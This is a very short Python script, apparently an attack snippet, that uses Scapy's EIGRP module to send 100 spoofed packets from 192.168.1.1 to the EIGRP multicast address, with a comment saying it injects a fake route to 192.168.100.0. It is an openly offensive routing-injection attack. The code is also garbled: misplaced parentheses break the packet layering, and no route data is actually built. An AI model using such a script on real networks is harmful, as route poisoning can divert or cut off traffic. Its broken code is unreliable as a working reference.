import time
from scapy.all import *
load_contrib('eigrp')

for i in range(0,100):

	#Inject fake route=192.168.100.0
	sendp(Ether()/IP(src='192.168.1.1'),dst="224.0.0.10")\
		/EIGRP()